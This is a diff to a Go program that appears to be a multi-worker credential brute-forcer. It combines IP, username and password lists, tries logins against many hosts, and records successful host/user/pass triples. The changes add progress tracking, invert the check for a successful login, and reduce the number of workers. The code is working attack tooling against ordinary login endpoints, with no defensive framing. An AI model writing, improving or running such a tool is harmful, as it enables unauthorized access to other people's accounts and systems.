@@ -27,6 +27,9 @@ var client = &http.Client{
 var counterMu sync.Mutex
 var executionCounter int
 var totalLines int
+var processedMu sync.Mutex
+var processedCount int
+var totalLinesInput int
 
 func countTotal(filename string) int {
 	file, err := os.Open(filename)
@@ -116,6 +119,15 @@ func saveResult(result string) {
 	file.WriteString(result + "\n")
 }
 
+func progress(current, total int) {
+	file, err := os.Create("progress.txt")
+	if err != nil {
+		return
+	}
+	defer file.Close()
+	fmt.Fprintf(file, "Processed: %d / %d\n", current, total)
+}
+
 type LoginRequest struct {
 	User string `json:"user"`
 	Pass string `json:"pass"`
@@ -154,7 +166,7 @@ func test(host, user, pass string, ctx context.Context) bool {
 
 	bodyStr := string(body)
 
-	if strings.Contains(bodyStr, "/prompt?") {
+	if !strings.Contains(bodyStr, "/prompt?") {
 		return true
 	}
 
@@ -190,6 +202,10 @@ func start(filename string, numberOfWorkers int, ctx context.Context) {
 				if success {
 					saveResult(fmt.Sprintf("Worker %d Success: %s %s %s", id, host, user, pass))
 				}
+				processedMu.Lock()
+				processedCount++
+				progress(processedCount, totalLinesInput)
+				processedMu.Unlock()
 			}
 		}(i)
 	}
@@ -233,11 +249,12 @@ func main() {
 	// Generate combinations first
 	generateCombinations("ip.txt", "user.txt", "password.txt")
 	totalLines = countTotal("ip.txt")
+	totalLinesInput = countTotal("input.txt")
 	if totalLines == 0 {
 		fmt.Println("No IPs found, exiting.")
 		return
 	}
 
 	// Call start with a sample filename and workers
-	start("input.txt", 10, ctx)
+	start("input.txt", 1, ctx)
 }
